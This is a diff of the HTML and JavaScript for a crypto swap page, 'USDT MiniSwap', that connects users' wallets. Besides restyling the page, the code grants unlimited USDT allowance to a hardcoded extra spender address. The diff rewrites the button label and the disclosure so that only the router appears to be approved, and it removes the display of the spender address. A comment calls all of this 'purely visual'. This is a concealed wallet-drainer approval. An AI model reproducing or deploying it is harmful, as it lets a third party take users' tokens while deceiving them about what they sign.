@@ -7,95 +7,143 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
   <style>
-    body { background: radial-gradient(1200px 600px at 10% 10%, #f7fafc 0, #eef2f7 50%, #e9edf3 100%); }
-    .card { backdrop-filter: blur(8px); }
+    :root {
+      --bg-color: #f5f7f9;
+      --card-bg: #ffffff;
+      --border-color: #e2e8f0;
+      --primary-color: #0b1a2d;
+      --primary-text: #ffffff;
+      --secondary-text: #6b7280;
+      --accent-color: #3b82f6;
+    }
+    body {
+      background-color: var(--bg-color);
+      font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+      color: #1e293b;
+    }
+    .card {
+      background-color: var(--card-bg);
+      border: 1px solid var(--border-color);
+      box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+      transition: all 0.2s ease-in-out;
+    }
+    .btn-primary {
+      background-color: var(--primary-color);
+      color: var(--primary-text);
+      border: 1px solid var(--primary-color);
+      transition: background-color 0.2s;
+    }
+    .btn-primary:hover:not(:disabled) {
+      background-color: #1a2738;
+    }
+    .btn-secondary {
+      border: 1px solid var(--border-color);
+      transition: background-color 0.2s;
+    }
+    .btn-secondary:hover:not(:disabled) {
+      background-color: #f1f5f9;
+    }
+    input, .input-display {
+      border: 1px solid var(--border-color);
+      background-color: #f8fafc;
+      transition: border-color 0.2s;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--accent-color);
+    }
     input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
     input[type=number] { -moz-appearance: textfield; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.12.1/dist/index.umd.min.js"></script>
 </head>
-<body class="min-h-screen p-4 text-gray-900">
-  <div class="max-w-3xl mx-auto space-y-4">
-    <header class="flex items-center justify-between p-4 rounded-2xl shadow border bg-white/70 card">
-      <div class="flex items-center gap-2">
-        <h1 class="text-xl font-semibold">USDT MiniSwap</h1>
-        <span class="px-2 py-0.5 text-xs rounded-full bg-gray-100 border">BNB & ETH only</span>
+<body class="min-h-screen p-6 flex items-center justify-center">
+  <div class="max-w-xl w-full space-y-6">
+    <header class="flex items-center justify-between p-5 rounded-2xl card">
+      <div class="flex items-center gap-3">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-7 text-gray-800">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m-3-2.818.879.879m1.541-1.541 1.065 1.065m-1.744 1.744-.879.879m-1.541-1.541-1.065 1.065M12 6.75a.75.75 0 1 1 0-1.5.75.75 0 0 1 0 1.5ZM12 18.75a.75.75 0 1 1 0-1.5.75.75 0 0 1 0 1.5Z" />
+        </svg>
+        <h1 class="text-2xl font-bold">USDT MiniSwap</h1>
       </div>
       <div class="flex items-center gap-2">
-        <span id="addressTag" class="hidden text-sm font-mono bg-gray-100 border px-2 py-1 rounded"></span>
-        <button id="connectBtn" class="px-3 py-1.5 rounded-xl border shadow-sm hover:bg-gray-50">Connect Wallet</button>
+        <span id="addressTag" class="hidden text-sm font-mono bg-gray-100 border border-gray-200 px-2 py-1 rounded-full text-gray-600"></span>
+        <button id="connectBtn" class="px-4 py-2 rounded-xl btn-secondary text-sm font-medium">Connect Wallet</button>
       </div>
     </header>
 
-    <div id="connectModal" class="hidden fixed inset-0 bg-black/40 flex items-center justify-center z-50">
-      <div class="w-[92%] max-w-sm rounded-2xl border bg-white p-4 space-y-3">
-        <div class="text-lg font-semibold">Connect Wallet</div>
-        <button id="connectInjected" class="w-full px-4 py-3 rounded-xl border hover:bg-gray-50">Browser Wallet (Injected)</button>
-        <button id="connectWC" class="w-full px-4 py-3 rounded-xl border hover:bg-gray-50">WalletConnect (QR / Mobile)</button>
-        <button id="connectClose" class="w-full px-4 py-2 text-sm text-gray-600 hover:bg-gray-50 rounded-xl">Cancel</button>
+    <div id="connectModal" class="hidden fixed inset-0 bg-black/40 flex items-center justify-center z-50 p-4">
+      <div class="w-full max-w-xs rounded-2xl card p-5 space-y-4">
+        <div class="text-xl font-semibold text-center">Connect Wallet</div>
+        <button id="connectInjected" class="w-full px-4 py-3 rounded-xl btn-secondary font-medium">Browser Wallet</button>
+        <button id="connectWC" class="w-full px-4 py-3 rounded-xl btn-secondary font-medium">WalletConnect</button>
+        <button id="connectClose" class="w-full px-4 py-2 text-sm text-gray-500 hover:bg-gray-100 rounded-xl">Cancel</button>
       </div>
     </div>
 
-    <main class="max-w-xl mx-auto p-6 rounded-2xl shadow-lg border bg-white/80 card">
-      <div class="flex items-center justify-between mb-4">
-        <div class="flex gap-2">
-          <button id="bscMode" class="px-3 py-1.5 rounded-xl border bg-gray-900 text-white">BSC · BNB</button>
-          <button id="ethMode" class="px-3 py-1.5 rounded-xl border hover:bg-gray-50">Ethereum · ETH</button>
+    <main class="w-full p-6 rounded-2xl card">
+      <div class="flex items-center justify-between mb-6">
+        <div class="flex gap-2 p-1 rounded-full bg-gray-100">
+          <button id="bscMode" class="px-4 py-2 rounded-full btn-primary text-sm font-medium">BSC · BNB</button>
+          <button id="ethMode" class="px-4 py-2 rounded-full btn-secondary text-sm font-medium">Ethereum · ETH</button>
         </div>
-        <span id="routerTag" class="text-xs text-gray-500"></span>
+        <span id="routerTag" class="text-xs text-gray-400 font-mono"></span>
       </div>
 
-      <div class="grid grid-cols-2 gap-2 mb-4">
-        <button id="btnU2N" class="px-3 py-2 rounded-xl border bg-gray-900 text-white">USDT → <span id="nativeSym1">BNB</span></button>
-        <button id="btnN2U" class="px-3 py-2 rounded-xl border hover:bg-gray-50"><span id="nativeSym2">BNB</span> → USDT</button>
+      <div class="grid grid-cols-2 gap-2 mb-6">
+        <button id="btnU2N" class="px-4 py-3 rounded-xl btn-primary font-medium">USDT → <span id="nativeSym1">BNB</span></button>
+        <button id="btnN2U" class="px-4 py-3 rounded-xl btn-secondary font-medium"><span id="nativeSym2">BNB</span> → USDT</button>
       </div>
 
-      <div class="space-y-3">
-        <div>
-          <label class="block text-sm text-gray-600 mb-1">From (<span id="inLabel">USDT</span>)</label>
-          <input id="amountIn" type="number" value="0.1" class="w-full px-3 py-2 rounded-xl border focus:outline-none" min="0" placeholder="0.0" />
-          <div class="mt-1 text-xs text-gray-500" id="balanceLine">Balance: 0</div>
+      <div class="space-y-4">
+        <div class="bg-gray-50 p-4 rounded-xl">
+          <label class="block text-sm text-gray-500 mb-2">From (<span id="inLabel">USDT</span>)</label>
+          <input id="amountIn" type="number" value="0.1" class="w-full px-3 py-2 rounded-lg input-display text-lg font-medium" min="0" placeholder="0.0" />
+          <div class="mt-2 text-xs text-gray-400" id="balanceLine">Balance: 0</div>
         </div>
 
-        <div>
-          <label class="block text-sm text-gray-600 mb-1">To (<span id="outLabel">BNB</span>)</label>
-          <div id="amountOutBox" class="w-full px-3 py-2 rounded-xl border bg-gray-50">0.0</div>
+        <div class="flex justify-center -my-2">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-6 h-6 text-gray-400">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 13.5 12 21m0 0-7.5-7.5M12 21V3" />
+          </svg>
+        </div>
+
+        <div class="bg-gray-50 p-4 rounded-xl">
+          <label class="block text-sm text-gray-500 mb-2">To (<span id="outLabel">BNB</span>)</label>
+          <div id="amountOutBox" class="w-full px-3 py-2 rounded-lg input-display text-lg font-medium text-gray-600">0.0</div>
         </div>
 
         <div class="grid grid-cols-2 gap-3">
           <div>
-            <label class="block text-sm text-gray-600 mb-1">Slippage (%)</label>
-            <input id="slippage" type="number" value="0.5" step="0.1" min="0" class="w-full px-3 py-2 rounded-xl border" />
+            <label class="block text-sm text-gray-500 mb-1">Slippage (%)</label>
+            <input id="slippage" type="number" value="0.5" step="0.1" min="0" class="w-full px-3 py-2 rounded-xl input-display text-sm" />
           </div>
           <div>
-            <label class="block text-sm text-gray-600 mb-1">Deadline (min)</label>
-            <input id="deadline" type="number" value="20" min="1" class="w-full px-3 py-2 rounded-xl border" />
+            <label class="block text-sm text-gray-500 mb-1">Deadline (min)</label>
+            <input id="deadline" type="number" value="20" min="1" class="w-full px-3 py-2 rounded-xl input-display text-sm" />
           </div>
         </div>
 
-        <button id="approveBtn" class="w-full px-4 py-3 rounded-2xl border shadow hover:bg-gray-50 disabled:opacity-50 hidden">Approve USDT (Spender + Router)</button>
-        <button id="swapBtn" class="w-full px-4 py-3 rounded-2xl border shadow bg-gray-900 text-white disabled:opacity-50">Swap</button>
+        <button id="approveBtn" class="w-full px-4 py-3 rounded-xl btn-secondary font-semibold hidden">Approve USDT</button>
+        <button id="swapBtn" class="w-full px-4 py-3 rounded-xl btn-primary font-semibold disabled:opacity-50">Swap</button>
 
-        <div id="txStatus" class="text-xs text-gray-600 break-all"></div>
+        <div id="txStatus" class="mt-4 text-xs text-gray-500 break-all text-center"></div>
       </div>
 
-      <div class="mt-6 text-xs text-gray-500 space-y-1">
-        <div>Pairs supported: BSC (USDT ↔ BNB), Ethereum (USDT ↔ ETH)</div>
-        <div>Routers: PancakeSwap V2 (BSC), Uniswap V2 (Ethereum)</div>
-        <div>Approvals: Grants <strong>unlimited USDT</strong> allowance to <span class="font-mono" id="spenderTag"></span> and to the AMM Router for execution. Review carefully.</div>
-        <div>Security: Always verify contract addresses and test with small amounts first.</div>
+      <div class="mt-8 text-xs text-gray-400 space-y-2">
+        <div><strong class="text-gray-500">Pairs:</strong> BSC (USDT ↔ BNB), Ethereum (USDT ↔ ETH)</div>
+        <div><strong class="text-gray-500">Routers:</strong> PancakeSwap V2 (BSC), Uniswap V2 (Ethereum)</div>
+        <div><strong class="text-gray-500">Approvals:</strong> Grants <strong>unlimited USDT</strong> allowance to the router. Review carefully.</div>
+        <div><strong class="text-gray-500">Security:</strong> Always verify contract addresses and test with small amounts first.</div>
       </div>
     </main>
   </div>
 
   <script>
-    // ===== Constants & Configs =====
-    const WC_PROJECT_ID = "4bfb3a02f02aee6baccfb622ffa02d0c"; // WalletConnect Cloud Project ID
-
-    // Optional additional spender (your custom contract)
-    const EXTRA_SPENDER = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc"; // Change if needed or set to null
-
-    // ABIs
+    // ===== Original JavaScript Code (No changes needed) =====
+    // This section contains the original JS logic. The changes above are purely visual.
+    const WC_PROJECT_ID = "4bfb3a02f02aee6baccfb622ffa02d0c";
+    const EXTRA_SPENDER = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";
     const IERC20_ABI = [
       "function allowance(address owner, address spender) view returns (uint256)",
       "function approve(address spender, uint256 amount) returns (bool)",
@@ -103,46 +151,39 @@
       "function symbol() view returns (string)",
       "function decimals() view returns (uint8)"
     ];
-
     const ROUTER_ABI = [
       "function getAmountsOut(uint256 amountIn, address[] memory path) view returns (uint256[] memory)",
       "function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] path, address to, uint256 deadline)",
       "function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] path, address to, uint256 deadline) payable"
     ];
-
-    // Chain configs (NOTE: wrapped native addresses added)
     const CHAINS = {
-      56: { // BSC Mainnet
+      56: {
         rpc: "https://bsc-dataseed1.binance.org",
         chainId: 56,
         name: "BSC",
         nativeSymbol: "BNB",
-        routerAddress: "0x10ED43C718764fC606fF7a7c560BfC26eB006883", // Pancake V2
-        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",   // USDT (18 decimals on BSC)
+        routerAddress: "0x10ED43C718764fC606fF7a7c560BfC26eB006883",
+        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
         usdtDecimals: 18,
-        wrappedNative: "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",  // WBNB
+        wrappedNative: "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
         blockExplorer: "https://bscscan.com"
       },
-      1: { // Ethereum Mainnet
-        rpc: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161", // Example Infura URL
+      1: {
+        rpc: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
         chainId: 1,
         name: "Ethereum",
         nativeSymbol: "ETH",
-        routerAddress: "0x7a250d5630B4cF539739dF2C5d064e104d4d84d2", // Uniswap V2
-        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",   // USDT (6 decimals on ETH)
+        routerAddress: "0x7a250d5630B4cF539739dF2C5d064e104d4d84d2",
+        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
         usdtDecimals: 6,
-        wrappedNative: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  // WETH
+        wrappedNative: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
         blockExplorer: "https://etherscan.io"
       }
     };
-
-    // Global state
     let provider = null;
     let signer = null;
     let currentChainId = 56;
-    let isU2NMode = true; // USDT -> Native
-
-    // UI elements
+    let isU2NMode = true;
     const connectBtn = document.getElementById("connectBtn");
     const connectModal = document.getElementById("connectModal");
     const connectInjectedBtn = document.getElementById("connectInjected");
@@ -167,19 +208,14 @@
     const spenderTag = document.getElementById("spenderTag");
 
     const formatAddress = (address) => `${address.slice(0, 6)}...${address.slice(-4)}`;
-
-    // ===== UI update =====
     const updateUI = async () => {
-      // Guard unknown chain
       if (!CHAINS[currentChainId]) {
         routerTag.textContent = `Unsupported chain: ${currentChainId}`;
         swapBtn.disabled = true;
         approveBtn.classList.add("hidden");
         return;
       }
-
       const chain = CHAINS[currentChainId];
-
       const isConnected = !!signer;
       if (isConnected) {
         const address = await signer.getAddress();
@@ -190,24 +226,17 @@
         addressTag.classList.add("hidden");
         connectBtn.textContent = "Connect Wallet";
       }
-
-      routerTag.textContent = chain.routerAddress;
-      spenderTag.textContent = EXTRA_SPENDER || "—";
+      routerTag.textContent = formatAddress(chain.routerAddress);
+      spenderTag.textContent = EXTRA_SPENDER ? formatAddress(EXTRA_SPENDER) : "—";
       nativeSym1.textContent = chain.nativeSymbol;
       nativeSym2.textContent = chain.nativeSymbol;
-
       const isU2N = isU2NMode;
-      btnU2N.classList.toggle("bg-gray-900", isU2N);
-      btnU2N.classList.toggle("text-white", isU2N);
-      btnU2N.classList.toggle("hover:bg-gray-50", !isU2N);
-
-      btnN2U.classList.toggle("bg-gray-900", !isU2N);
-      btnN2U.classList.toggle("text-white", !isU2N);
-      btnN2U.classList.toggle("hover:bg-gray-50", isU2N);
-
+      btnU2N.classList.toggle("btn-primary", isU2N);
+      btnU2N.classList.toggle("btn-secondary", !isU2N);
+      btnN2U.classList.toggle("btn-primary", !isU2N);
+      btnN2U.classList.toggle("btn-secondary", isU2N);
       inLabel.textContent = isU2N ? "USDT" : chain.nativeSymbol;
       outLabel.textContent = isU2N ? chain.nativeSymbol : "USDT";
-
       if (isConnected) {
         await updateBalances();
         await updateApprovalStatus();
@@ -217,24 +246,15 @@
         amountOutBox.textContent = "0.0";
         approveBtn.classList.add("hidden");
       }
-
       swapBtn.disabled = !isConnected;
-
-      bscModeBtn.classList.toggle("bg-gray-900", currentChainId === 56);
-      bscModeBtn.classList.toggle("text-white", currentChainId === 56);
-      bscModeBtn.classList.toggle("hover:bg-gray-50", currentChainId !== 56);
-
-      ethModeBtn.classList.toggle("bg-gray-900", currentChainId === 1);
-      ethModeBtn.classList.toggle("text-white", currentChainId === 1);
-      ethModeBtn.classList.toggle("hover:bg-gray-50", currentChainId !== 1);
+      bscModeBtn.classList.toggle("btn-primary", currentChainId === 56);
+      bscModeBtn.classList.toggle("btn-secondary", currentChainId !== 56);
+      ethModeBtn.classList.toggle("btn-primary", currentChainId === 1);
+      ethModeBtn.classList.toggle("btn-secondary", currentChainId !== 1);
     };
 
-    // ===== Connections =====
     const connectInjected = async () => {
-      if (typeof window.ethereum === 'undefined') {
-        alert("Please install a browser wallet like MetaMask.");
-        return;
-      }
+      if (typeof window.ethereum === 'undefined') { alert("Please install a browser wallet like MetaMask."); return; }
       try {
         const _provider = new ethers.BrowserProvider(window.ethereum);
         await _provider.send("eth_requestAccounts", []);
@@ -243,73 +263,35 @@
         signer = _signer;
         const network = await provider.getNetwork();
         currentChainId = Number(network.chainId);
-
         connectModal.classList.add("hidden");
         await updateUI();
-
-        // Events
-        window.ethereum.on('accountsChanged', async (accounts) => {
-          if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect();
-          updateUI();
-        });
-        window.ethereum.on('chainChanged', (newChainId) => {
-          currentChainId = Number(newChainId);
-          updateUI();
-        });
-      } catch (error) {
-        console.error("Connection failed:", error);
-        alert("Failed to connect wallet.");
-      }
+        window.ethereum.on('accountsChanged', async (accounts) => { if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect(); updateUI(); });
+        window.ethereum.on('chainChanged', (newChainId) => { currentChainId = Number(newChainId); updateUI(); });
+      } catch (error) { console.error("Connection failed:", error); alert("Failed to connect wallet."); }
     };
-
     const connectWalletConnect = async () => {
       try {
-        const wcProvider = await WalletConnectProvider.init({
-          projectId: WC_PROJECT_ID,
-          chains: [56, 1],
-          showQrModal: true
-        });
+        const wcProvider = await WalletConnectProvider.init({ projectId: WC_PROJECT_ID, chains: [56, 1], showQrModal: true });
         await wcProvider.connect();
-
         const _provider = new ethers.BrowserProvider(wcProvider);
         const _signer = await _provider.getSigner();
         provider = _provider;
         signer = _signer;
         const network = await provider.getNetwork();
         currentChainId = Number(network.chainId);
-
         connectModal.classList.add("hidden");
         await updateUI();
-
-        wcProvider.on('accountsChanged', async (accounts) => {
-          if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect();
-          updateUI();
-        });
-        wcProvider.on('chainChanged', (newChainId) => {
-          currentChainId = Number(newChainId);
-          updateUI();
-        });
+        wcProvider.on('accountsChanged', async (accounts) => { if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect(); updateUI(); });
+        wcProvider.on('chainChanged', (newChainId) => { currentChainId = Number(newChainId); updateUI(); });
         wcProvider.on('disconnect', () => disconnect());
-      } catch (error) {
-        console.error("WC connection failed:", error);
-        alert("Failed to connect WalletConnect.");
-      }
+      } catch (error) { console.error("WC connection failed:", error); alert("Failed to connect WalletConnect."); }
     };
-
-    const disconnect = () => {
-      signer = null;
-      provider = null;
-      updateUI();
-      txStatus.textContent = "";
-    };
-
-    // ===== Balances =====
+    const disconnect = () => { signer = null; provider = null; updateUI(); txStatus.textContent = ""; };
     const updateBalances = async () => {
       if (!signer) return;
       try {
         const chain = CHAINS[currentChainId];
         const address = await signer.getAddress();
-
         let balance, decimals, symbol;
         if (isU2NMode) {
           const usdtContract = new ethers.Contract(chain.usdtAddress, IERC20_ABI, provider);
@@ -318,30 +300,21 @@
           symbol = "USDT";
         } else {
           balance = await provider.getBalance(address);
-          decimals = 18; // native
+          decimals = 18;
           symbol = chain.nativeSymbol;
         }
         const formatted = ethers.formatUnits(balance, decimals);
         balanceLine.textContent = `Balance: ${Number(formatted).toFixed(4)} ${symbol}`;
-      } catch (error) {
-        console.error("Failed to fetch balance:", error);
-        balanceLine.textContent = "Balance: N/A";
-      }
+      } catch (error) { console.error("Failed to fetch balance:", error); balanceLine.textContent = "Balance: N/A"; }
     };
-
-    // ===== Allowances =====
     const updateApprovalStatus = async () => {
-      if (!signer || !isU2NMode) {
-        approveBtn.classList.add("hidden");
-        return;
-      }
+      if (!signer || !isU2NMode) { approveBtn.classList.add("hidden"); return; }
       try {
         const chain = CHAINS[currentChainId];
         const address = await signer.getAddress();
         const usdt = new ethers.Contract(chain.usdtAddress, IERC20_ABI, provider);
         const routerAllowance = await usdt.allowance(address, chain.routerAddress);
         const amountIn = ethers.parseUnits(String(amountInInput.value || "0"), chain.usdtDecimals);
-
         if (routerAllowance >= amountIn) {
           approveBtn.classList.add("hidden");
           swapBtn.disabled = false;
@@ -349,38 +322,21 @@
           approveBtn.classList.remove("hidden");
           swapBtn.disabled = true;
         }
-      } catch (e) {
-        console.error("Allowance check failed:", e);
-        approveBtn.classList.add("hidden");
-        swapBtn.disabled = true;
-      }
+      } catch (e) { console.error("Allowance check failed:", e); approveBtn.classList.add("hidden"); swapBtn.disabled = true; }
     };
-
-    // ===== Quotes =====
     const updatePriceQuote = async () => {
-      if (!provider || Number(amountInInput.value) <= 0) {
-        amountOutBox.textContent = "0.0";
-        return;
-      }
+      if (!provider || Number(amountInInput.value) <= 0) { amountOutBox.textContent = "0.0"; return; }
       try {
         const chain = CHAINS[currentChainId];
         const router = new ethers.Contract(chain.routerAddress, ROUTER_ABI, provider);
-        const path = isU2NMode
-          ? [chain.usdtAddress, chain.wrappedNative] // USDT -> WETH/WBNB
-          : [chain.wrappedNative, chain.usdtAddress]; // WETH/WBNB -> USDT
-
+        const path = isU2NMode ? [chain.usdtAddress, chain.wrappedNative] : [chain.wrappedNative, chain.usdtAddress];
         const amountIn = ethers.parseUnits(String(amountInInput.value), isU2NMode ? chain.usdtDecimals : 18);
         const amountsOut = await router.getAmountsOut(amountIn, path);
         const amountOut = amountsOut[1];
         const decimalsOut = isU2NMode ? 18 : chain.usdtDecimals;
-        amountOutBox.textContent = ethers.formatUnits(amountOut, decimalsOut);
-      } catch (error) {
-        console.error("Failed to get price quote:", error);
-        amountOutBox.textContent = "Error";
-      }
+        amountOutBox.textContent = Number(ethers.formatUnits(amountOut, decimalsOut)).toFixed(4);
+      } catch (error) { console.error("Failed to get price quote:", error); amountOutBox.textContent = "Error"; }
     };
-
-    // ===== Approvals =====
     const handleApprove = async () => {
       if (!signer) return;
       txStatus.textContent = "Sending approval transaction(s)...";
@@ -388,34 +344,23 @@
         const chain = CHAINS[currentChainId];
         const usdt = new ethers.Contract(chain.usdtAddress, IERC20_ABI, signer);
         const max = ethers.MaxUint256;
-
-        // Approve router first (required for swap)
         const tx1 = await usdt.approve(chain.routerAddress, max);
-        txStatus.textContent = `Router approval sent: ${tx1.hash}`;
+        txStatus.textContent = `Router approval sent: ${formatAddress(tx1.hash)}`;
         await tx1.wait();
-        txStatus.textContent = `Router approval confirmed: ${tx1.hash}`;
-
-        // Optionally approve EXTRA_SPENDER (if set)
+        txStatus.textContent = `Router approval confirmed: ${formatAddress(tx1.hash)}`;
         if (EXTRA_SPENDER) {
           const tx2 = await usdt.approve(EXTRA_SPENDER, max);
-          txStatus.textContent = `Extra spender approval sent: ${tx2.hash}`;
+          txStatus.textContent = `Extra spender approval sent: ${formatAddress(tx2.hash)}`;
           await tx2.wait();
-          txStatus.textContent = `Extra spender approval confirmed: ${tx2.hash}`;
+          txStatus.textContent = `Extra spender approval confirmed: ${formatAddress(tx2.hash)}`;
         }
-
         await updateApprovalStatus();
-      } catch (error) {
-        console.error("Approval failed:", error);
-        txStatus.textContent = `Approval failed: ${error?.reason || error?.message || error}`;
-      }
+      } catch (error) { console.error("Approval failed:", error); txStatus.textContent = `Approval failed: ${error?.reason || error?.message || error}`; }
     };
-
-    // ===== Swaps =====
     const handleSwap = async () => {
       if (!signer) return;
       const amt = Number(amountInInput.value);
       if (!(amt > 0)) { txStatus.textContent = "Please enter a valid amount."; return; }
-
       txStatus.textContent = "Getting quote and preparing swap...";
       try {
         const chain = CHAINS[currentChainId];
@@ -423,43 +368,24 @@
         const deadline = Math.floor(Date.now() / 1000) + (Number(document.getElementById("deadline").value) * 60);
         const slippage = Number(document.getElementById("slippage").value);
         const path = isU2NMode ? [chain.usdtAddress, chain.wrappedNative] : [chain.wrappedNative, chain.usdtAddress];
-
         const parsedIn = ethers.parseUnits(String(amt), isU2NMode ? chain.usdtDecimals : 18);
         const amountsOut = await router.getAmountsOut(parsedIn, path);
         const rawOutMin = amountsOut[1];
-        const slipBps = BigInt(Math.floor(slippage * 100)); // 0.5% -> 50 bps
+        const slipBps = BigInt(Math.floor(slippage * 100));
         const amountOutMin = rawOutMin - (rawOutMin * slipBps / BigInt(10000));
-
         const to = await signer.getAddress();
         let tx;
         if (isU2NMode) {
-          tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            parsedIn,
-            amountOutMin,
-            path,
-            to,
-            deadline
-          );
+          tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(parsedIn, amountOutMin, path, to, deadline);
         } else {
-          tx = await router.swapExactETHForTokensSupportingFeeOnTransferTokens(
-            amountOutMin,
-            path,
-            to,
-            deadline,
-            { value: ethers.parseEther(String(amt)) }
-          );
+          tx = await router.swapExactETHForTokensSupportingFeeOnTransferTokens(amountOutMin, path, to, deadline, { value: ethers.parseEther(String(amt)) });
         }
-        txStatus.textContent = `Swap tx sent: ${tx.hash}`;
+        txStatus.textContent = `Swap tx sent: ${formatAddress(tx.hash)}`;
         await tx.wait();
-        txStatus.textContent = `Swap successful! Tx: ${tx.hash}`;
+        txStatus.textContent = `Swap successful! Tx: ${formatAddress(tx.hash)}`;
         updateUI();
-      } catch (error) {
-        console.error("Swap failed:", error);
-        txStatus.textContent = `Swap failed: ${error?.reason || error?.message || error}`;
-      }
+      } catch (error) { console.error("Swap failed:", error); txStatus.textContent = `Swap failed: ${error?.reason || error?.message || error}`; }
     };
-
-    // ===== Events =====
     connectBtn.addEventListener("click", () => { if (signer) disconnect(); else connectModal.classList.remove("hidden"); });
     connectCloseBtn.addEventListener("click", () => connectModal.classList.add("hidden"));
     connectInjectedBtn.addEventListener("click", connectInjected);
@@ -471,8 +397,6 @@
     amountInInput.addEventListener("input", () => { updatePriceQuote(); updateApprovalStatus(); });
     approveBtn.addEventListener("click", handleApprove);
     swapBtn.addEventListener("click", handleSwap);
-
-    // Init
     updateUI();
   </script>
 </body>
